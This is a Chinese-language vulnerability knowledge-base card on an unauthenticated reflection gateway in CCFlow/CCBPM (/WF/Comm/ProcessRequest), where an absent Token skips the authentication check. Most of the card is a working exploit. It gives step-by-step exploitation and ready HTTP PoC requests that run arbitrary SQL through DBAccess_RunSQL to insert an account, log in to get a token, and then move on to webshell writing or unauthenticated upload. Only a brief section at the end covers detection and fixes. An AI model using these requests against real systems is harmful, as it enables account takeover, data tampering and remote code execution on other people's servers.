---
id: web-generic-auth-ccflow-processrequest-reflection-token-bypass
title: CCFlow/CCBPM ProcessRequest 反射网关：缺 Token 即跳过鉴权，未授权调用任意无参公共方法
type: scenario
domain: web
path: web/generic/auth
technique: dotnet-reflection-handler-missing-token-auth-bypass
aliases:
- CCFlow ProcessRequest 未授权
- DoType=HttpHandler DoMethod 反射
- HttpHandlerName 任意类调用
- DealToken 空 token 绕过
- DBAccess_RunSQL 未授权执行 SQL
- 低代码 BPM 前台 RCE 入口
tags:
- dotnet
- ccfpm
- low-code
- auth-bypass
- reflection
- http-handler
- unauth
- sql-execution
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T08:59:22+08:00'
  notes: 已对照原文及61张图核对：图31 CommController.ProcessRequest 反射调用 ctrl.DoMethod(ctrl,ctrl.DoType)，CtrlType=typeof(WF_Comm)；图34 DoType 依次取 DoType/Action/action/Method；图42 WF_Comm.HttpHandler 用 HttpHandlerName 取 Type/ClassFactory 后 DoMethod；图35 DealToken 在 Token 为空时直接 return null；图36/41 DoMethod 忽略该返回值继续 MethodInfo.Invoke，管理员判断仅在类名含 Admin_ 或 GPMPage 时执行。图44 DBAccess_RunSQL 返回 1，图48 Login_Submit 返回 Token。修正提示：图49 Entities_RetrieveAll 实际返回 err@没有找到[TS.Sys.SFDBSrc]的map（业务映射错误，非鉴权失败），卡内'调用成功'应理解为已通过鉴权；PoC 中插入账号为 test1 而登录示例为 test，复现时需一致。PoC 未在本机执行。
---

## 一句话结论

CCFlow/CCBPM 的 `/WF/Comm/ProcessRequest` 是一个两层反射分发网关：外层 `DoType=HttpHandler` 调用 `WF_Comm.HttpHandler()`，内层用 `HttpHandlerName` 实例化任意 `DirectoryPageBase` 子类、用 `DoMethod` 调用其任意无参公共方法；而 `DirectoryPageBase.DoMethod()` 里的 `DealToken()` 在请求不带 `Token` 参数时直接 `return null`，等于跳过鉴权。攻击者因此可未授权调用 `DBAccess_RunSQL` 执行任意 SQL（原文插入管理员账号）、再登录拿 token 访问全部接口。

## 原理

- **外层路由**：`CommController.ProcessRequest()`（`[Route("WF/[controller]/[Action]")]`）创建 `DirectoryPageBase ctrl = Activator.CreateInstance(CtrlType)`（`CtrlType` 返回 `typeof(WF_Comm)`），然后执行 `ctrl.DoMethod(ctrl, ctrl.DoType)`。
- **DoType 可控**：`DirectoryPageBase.DoType` 依次从请求参数 `DoType`、`Action`、`action`、`Method` 取值，因此 `DoType=HttpHandler` 会调用 `WF_Comm` 的 `HttpHandler()` 方法。
- **内层反射**：`WF_Comm.HttpHandler()` 读取 `HttpHandlerName` 与 `DoMethod` 两个请求参数；先 `Type.GetType(httpHandlerName)`，取不到再用 `ClassFactory.GetHandlerPage(httpHandlerName)`；随后 `Activator.CreateInstance(type)` 得到 `DirectoryPageBase en`，并 `return en.DoMethod(en, methodName)`。即 `HttpHandlerName` 可指定任意继承 `DirectoryPageBase` 的类，`DoMethod` 可指定该类任意方法。
- **鉴权跳过**：`DirectoryPageBase.DoMethod(DirectoryPageBase myEn, string methodName)` 只拒绝方法名包含 `>` 的请求；当 `WebUser.No == null` 时计算 `isCanDealToken`（仅对 `Login`/`Index`/`Admin` 等少数情况为 false），其余方法都调用 `this.DealToken(myEn, myEn.DoType)`。`DealToken` 先 `string token = page.GetRequestVal("Token"); if (DataType.IsNullOrEmpty(token)) return null;`——请求完全不传 `Token` 时直接返回，不查库、不校验、不抛异常，随后代码继续 `MethodInfo mp = tp.GetMethod(methodName); return mp.Invoke(this, null) as string;`。
- **调用链**：`ProcessRequest` → `WF_Comm.HttpHandler()` → `WF_Comm.DoMethod(..., "DBAccess_RunSQL")` → `MethodInfo.Invoke` → `DBAccess_RunSQL()`。`DBAccess_RunSQL` 从 `SQL` 参数取语句（`UrlDecode` 并替换引号后）交给 `DBAccess.RunSQL` 执行，没有权限判断；同类还有 `DBAccess_RunSQLReturnTable`、`Watchdog_Init`、`Author_InitLeft`、`Entities_RetrieveAll` 等大量无参公共方法。
- 管理员判断只在 `DoMethod` 后半段按类名包含 `Admin_`（且非 `WF_Admin_TestingContainer`/`WF_Admin_DevelopDesigner`）时检查 `WebUser.IsAdmin`，与上述无参方法调用路径无关；选择非 Admin 类即可绕过。

## 触发条件

- 目标为 CCFlow.NetCore / CCBPM（原文“某低代码 BPM”），`/WF/Comm/ProcessRequest` 可达；
- 请求可控制 `DoType`、`DoMethod`、`HttpHandlerName` 参数；
- 目标类存在无参公共方法（`DBAccess_RunSQL`、文件上传类、查询类等）；
- 数据库账号有对应 SQL 权限（默认应用账号即可）。

## 利用步骤

1. 访问 `/WF/Comm/ProcessRequest?DoType=HttpHandler&DoMethod=DBAccess_RunSQL&HttpHandlerName=BP.WF.HttpHandler.WF_Comm`，以 multipart 提交 `SQL=INSERT INTO Port_Emp ...` 创建已知口令的账号。
2. 用新账号调用 `Login_Submit`（`HttpHandlerName=BP.WF.HttpHandler.WF_Portal`）登录，响应 URL 中带 `Token=<uuid>`。
3. 带该 `Token` 调用 `Entities_RetrieveAll`、`DBAccess_RunSQL` 等接口，确认可读写任意数据。
4. 若目标为 MySQL/SQL Server 且权限足够，用 SQL 写文件/写 Webshell；或改用内层 `HttpHandlerName` 指向文件上传类，未授权上传 getshell。

## PoC

```http
POST /WF/Comm/ProcessRequest?DoType=HttpHandler&DoMethod=DBAccess_RunSQL&HttpHandlerName=BP.WF.HttpHandler.WF_Comm HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryP1O8Ipz3pXdNUWzn

------WebKitFormBoundaryP1O8Ipz3pXdNUWzn
Content-Disposition: form-data; name="SQL"

INSERT INTO Port_Emp (No, Name, PinYin, Pass, FK_Dept, Tel, Email, EmpSta, Idx)
VALUES ('test1', 'test1', 'admin,admin,admin/jtzb', '123456', '100', '0531-82374939', '111@qq.com', '0', '0');
------WebKitFormBoundaryP1O8Ipz3pXdNUWzn--
```

```http
POST /WF/Comm/ProcessRequest?DoType=HttpHandler&DoMethod=Login_Submit&HttpHandlerName=BP.WF.HttpHandler.WF_Portal HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryK1iBBVBOwt8yDPVc

------WebKitFormBoundaryK1iBBVBOwt8yDPVc
Content-Disposition: form-data; name="TB_No"

test
------WebKitFormBoundaryK1iBBVBOwt8yDPVc
Content-Disposition: form-data; name="TB_PW"

<前端加密后的口令>
------WebKitFormBoundaryK1iBBVBOwt8yDPVc--
```

原文响应 `url@Default.htm?Token=4b560042-f7e3-40f0-be59-7e7fbba34c55&UserNo=test`；随后带 `Token` 调用 `Entities_RetrieveAll` 等接口成功。

## 变体与关联

- 方法变体：`DBAccess_RunSQLReturnTable`、`Watchdog_Init`、`StartEaryer_Init`、`Search_Count`、`Author_InitLeft`、`Author_InitDocs`、`AiFrm_SaveAttrsExt`、`Menu_Start_SpecFlow` 等无参方法均可通过同一网关调用。
- 类变体：`HttpHandlerName` 可换任意 `DirectoryPageBase` 子类，包括文件上传类（`BP.CCOA.HttpHandler.CCOA_Knowledge`、`BP.WF.HttpHandler.WF_CommTS`、`BP.CCBill.HttpHandler.CCBill_Components` 等），形成未授权上传链。
- 关联：[[web-generic-file-upload-ccflow-iis-webconfig-aspx]]（该网关下的文件上传 sink）；[[web-generic-auth-ccflow-demo-port-emp-unauth]]（Demo 注入 + privateKey 伪造的另一条入口）。
- 通用模式：反射型“方法名/类名来自请求”的网关只要鉴权函数对缺参返回真/空，就会被空参数绕过。

## 检测与防御

- 检测：`/WF/Comm/ProcessRequest` 参数含 `DoType=HttpHandler`、`HttpHandlerName=`、`DoMethod=`；`SQL=` 参数或异常栈中出现 `DBAccess_RunSQL`；请求不带 `Token` 却调用非登录方法；响应异常页出现完整 SQL。
- 修复：`DealToken` 在 token 为空时抛异常而不是 `return null`；对 `HttpHandlerName`/`DoMethod` 使用白名单，禁止反射任意类/方法；移除或鉴权 `DBAccess_RunSQL` 等危险方法。
- 加固：WAF 拦截 `DoType=HttpHandler` 与 `DBAccess_RunSQL`；关闭详细异常页；数据库账号最小权限；限制 `/WF/Comm/ProcessRequest` 来源。
